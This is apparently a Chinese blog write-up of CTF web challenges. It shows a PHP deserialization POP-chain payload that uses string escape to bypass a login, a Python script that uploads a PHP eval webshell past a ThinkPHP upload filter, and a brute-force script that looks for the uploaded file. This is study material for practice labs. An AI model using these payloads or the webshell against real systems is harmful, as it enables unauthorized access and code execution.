class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$b=<span class="keyword">new</span> User();</span><br><span class="line">$c=<span class="keyword">new</span> Info();</span><br><span class="line">$d=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">$d-&gt;token=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$d-&gt;name=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$b-&gt;age=<span class="string">&quot;select password,id from users where username=?&quot;</span>;</span><br><span class="line">$c-&gt;CtrlCase=$d;</span><br><span class="line">$b-&gt;nickname=$c;</span><br><span class="line">$a-&gt;sql=$b;</span><br><span class="line"><span class="comment">#echo (serialize($a));</span></span><br><span class="line">unserialize(<span class="string">&quot;O:12:\&quot;UpdateHelper\&quot;:1:&#123;s:3:\&quot;sql\&quot;;O:4:\&quot;User\&quot;:3:&#123;s:2:\&quot;id\&quot;;N;s:3:\&quot;age\&quot;;s:52:\&quot;select password,id from users where username=&#x27;admin&#x27;\&quot;;s:8:\&quot;nickname\&quot;;O:4:\&quot;Info\&quot;:1:&#123;s:8:\&quot;CtrlCase\&quot;;O:6:\&quot;dbCtrl\&quot;:8:&#123;s:8:\&quot;hostname\&quot;;s:9:\&quot;localhost\&quot;;s:6:\&quot;dbuser\&quot;;s:4:\&quot;root\&quot;;s:6:\&quot;dbpass\&quot;;s:11:\&quot;as119801222\&quot;;s:8:\&quot;database\&quot;;s:8:\&quot;security\&quot;;s:4:\&quot;name\&quot;;s:5:\&quot;admin\&quot;;s:8:\&quot;password\&quot;;N;s:6:\&quot;mysqli\&quot;;N;s:5:\&quot;token\&quot;;s:5:\&quot;admin\&quot;;&#125;&#125;&#125;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>由于以上的poc我连接的是本地的数据库来测试，所以后面需要改回去<br>接下来就是让这里的反序列化内容逃逸出去<br>这里说一下遇到的坑：<br>1.记得前面的内容要有引号闭合，后面要有花括号闭合<br>2.原本的反序列化内容还有个CtrlCase，我们的payload拼接进去以后会被挤到后面去就被丢掉了，所以需要在我们的payload之前加一下（在这里卡了很久无语了）</p>
<p>这是终极payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=<span class="string">&quot;loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload\&quot;;O:12:\\\&quot;UpdateHelper\\\&quot;:1:&#123;s:3:\\\&quot;sql\\\&quot;;O:4:\\\&quot;User\\\&quot;:3:&#123;s:2:\\\&quot;id\\\&quot;;N;s:3:\\\&quot;age\\\&quot;;s:52:\\\&quot;select password,id from users where username = &#x27;admin&#x27;\\\&quot;;s:8:\\\&quot;nickname\\\&quot;;O:4:\\\&quot;Info\\\&quot;:1:&#123;s:8:\\\&quot;CtrlCase\\\&quot;;O:6:\\\&quot;dbCtrl\\\&quot;:8:&#123;s:8:\\\&quot;hostname\\\&quot;;s:9:\\\&quot;localhost\\\&quot;;s:6:\\\&quot;dbuser\\\&quot;;s:4:\\\&quot;root\\\&quot;;s:6:\\\&quot;dbpass\\\&quot;;s:11:\\\&quot;as119801222\\\&quot;;s:8:\\\&quot;database\\\&quot;;s:8:\\\&quot;security\\\&quot;;s:4:\\\&quot;name\\\&quot;;s:5:\\\&quot;admin\\\&quot;;s:8:\\\&quot;password\\\&quot;;N;s:6:\\\&quot;mysqli\\\&quot;;N;s:5:\\\&quot;token\\\&quot;;s:5:\\\&quot;admin\\\&quot;;&#125;&#125;&#125;&#125;&quot;</span>;</span><br><span class="line">        $nickname=<span class="string">&quot;11&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//        $this-&gt;age=$age;</span></span><br><span class="line"><span class="comment">//        $this-&gt;nickname=$nickname;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$b=<span class="keyword">new</span> User();</span><br><span class="line">$c=<span class="keyword">new</span> Info();</span><br><span class="line">$d=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">$d-&gt;token=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$d-&gt;name=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$b-&gt;age=<span class="string">&quot;select password,id from users where username=?&quot;</span>;</span><br><span class="line">$c-&gt;CtrlCase=$d;</span><br><span class="line">$b-&gt;nickname=$c;</span><br><span class="line">$a-&gt;sql=$b;</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&quot;loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload\&quot;;s:8:\&quot;CtrlCase\&quot;;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (serialize($a));</span><br></pre></td></tr></table></figure>

<p>在本地调试是可以的==但是不知道为啥放到题目下就不行了，我人傻了</p>
<p>可以看到因为数据库的账号密码不匹配所以返回了错误信息。<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719201223.png" alt="img" style="zoom: 80%;"></p>
<p>我以为是我的payload出了问题，但是直接复制粘贴别人的也没有可以的–无语了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload<span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelper<span class="string">&quot;:1:&#123;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>User<span class="string">&quot;:3:&#123;s:2:&quot;</span>id<span class="string">&quot;;N;s:3:&quot;</span>age<span class="string">&quot;;s:46:&quot;</span>select password,id <span class="keyword">from</span> users where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:2:&#123;s:3:&quot;</span>age<span class="string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:8:&#123;s:8:&quot;</span>hostname<span class="string">&quot;;s:9:&quot;</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&quot;;s:6:&quot;</span>dbuser<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:6:&quot;</span>dbpass<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:8:&quot;</span>database<span class="string">&quot;;s:4:&quot;</span>test<span class="string">&quot;;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;N;s:6:&quot;</span>mysqli<span class="string">&quot;;N;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>后来感觉还是很不甘心，于是又去找了一下其他人的payload，发现有一个人的可以用，可是s:2:”as”;这个部分从哪里来的属实没懂找了好几个师傅的题解都没看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload<span class="string">&quot;;s:2:&quot;</span><span class="keyword">as</span><span class="string">&quot;;O:12:&quot;</span>UpdateHelper<span class="string">&quot;:1:&#123;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>User<span class="string">&quot;:3:&#123;s:2:&quot;</span>id<span class="string">&quot;;N;s:3:&quot;</span>age<span class="string">&quot;;s:46:&quot;</span>select password,id <span class="keyword">from</span> users where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:2:&#123;s:3:&quot;</span>age<span class="string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:8:&#123;s:8:&quot;</span>hostname<span class="string">&quot;;s:9:&quot;</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&quot;;s:6:&quot;</span>dbuser<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:6:&quot;</span>dbpass<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:8:&quot;</span>database<span class="string">&quot;;s:4:&quot;</span>test<span class="string">&quot;;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;N;s:6:&quot;</span>mysqli<span class="string">&quot;;N;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>而且在本地运行的时候就运行不来，盲猜是题目没配置好吧？<br>越想越不合理，又重新尝试了一下，发现我那个又可以了，但是本地却不行了,于是再尝试了一下，发现二者之间相差两个字符，也就是本地能成功的，只要拿掉一个load，也就是扣掉两个字符在题目环境下就能成功。而且很无语的是扣掉两个花括号也能成功==，无语了</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>完整做下来以后还是收获了很多，主要是有很多小坑，当代码读完一遍吼，反序列pop链的构造其实并没有很困难，就是那几个魔术方法运用一下就型，顺着思路走就行。坑点主要就是上面那几个，说说学到了啥<br>1.学到了很多调试方案，当我拼接以后一直尝试不出来的时候，对那串反序列化一个部分一个部分进行调试，才发现需要保证其完整性<br>2.那个s从哪里来的真的把我搞懵了==用题目下下来的源码去跑这个payload是出不来东西的，用原本的才行，而在题目的环境中却又必须要用那个玩意？？</p>
<p><a href="https://www.1ight.top/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%94%bb%e5%87%bb/#comment-9">https://www.1ight.top/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%94%bb%e5%87%bb/#comment-9</a></p>
]]></content>
  </entry>
  <entry>
    <title>buu23</title>
    <url>/2021/07/24/buu23/</url>
    <content><![CDATA[<h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>开头源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>尝试了一下其他后缀名上传，发现无法被解析成功，所以看到这个upload()函数，以及对应的防护机制，猜测可以使用条件竞争绕过，写先一下脚本</p>
<p>thinkphp默认上传路径为：<br>/home/index/upload<br>所以有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5ff85f06-6397-4b0b-9dc6-362da72c71bb.node4.buuoj.cn/index.php/home/index/upload&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line">files1=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;&lt;?php eval($_GET[&#x27;a&#x27;]); ?&gt;)&quot;</span>)&#125;</span><br><span class="line">r=s.post(url,files=files).text</span><br><span class="line">print(r)</span><br><span class="line">r=s.post(url,files=files1).text</span><br><span class="line">print(r)</span><br><span class="line">r=s.post(url,files=files).text</span><br><span class="line">print(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-07-24\&#x2F;60fbd50e4d0f4.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-07-24\&#x2F;60fbd50e61127.txt&quot;,&quot;success&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是去爆破一下这个文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">60fbd50e61127</span><br><span class="line">60fbd50e4d0f4</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5ff85f06-6397-4b0b-9dc6-362da72c71bb.node4.buuoj.cn/Public/Uploads/2021-07-24/&quot;</span></span><br><span class="line"><span class="comment"># files=&#123;&#x27;file&#x27;:(&quot;1.txt&quot;,&quot;&quot;)&#125;</span></span><br><span class="line"><span class="comment"># files1=&#123;&#x27;file[]&#x27;:(&quot;1.php&quot;,&quot;&lt;?php eval($_GET[&#x27;a&#x27;]); ?&gt;)&quot;)&#125;</span></span><br><span class="line"><span class="comment"># r=s.post(url,files=files).text</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"><span class="comment"># r=s.post(url,files=files1).text</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"><span class="comment"># r=s.post(url,files=files).text</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line">str=<span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> str:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> str:</span><br><span class="line">                <span class="keyword">for</span> o <span class="keyword">in</span> str:</span><br><span class="line">                    url_fina=url+<span class="string">f&quot;60fbd50e<span class="subst">&#123;i&#125;</span><span class="subst">&#123;j&#125;</span><span class="subst">&#123;f&#125;</span><span class="subst">&#123;k&#125;</span><span class="subst">&#123;o&#125;</span>.php&quot;</span></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        r=requests.get(url,timeout=<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> r.status_code!=<span class="number">404</span>:</span><br><span class="line">                        print(url_fina)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是现在buu的防止太多请求太严了–一直跑不出来</p>
<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p>忘保存了，没了很难受，大概就是照一张256像素一下的图片，然后将图片内容改为这一行因为那两个解析函数的解析方式在这里不同</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210724182401.png" alt="img" style="zoom:67%;">

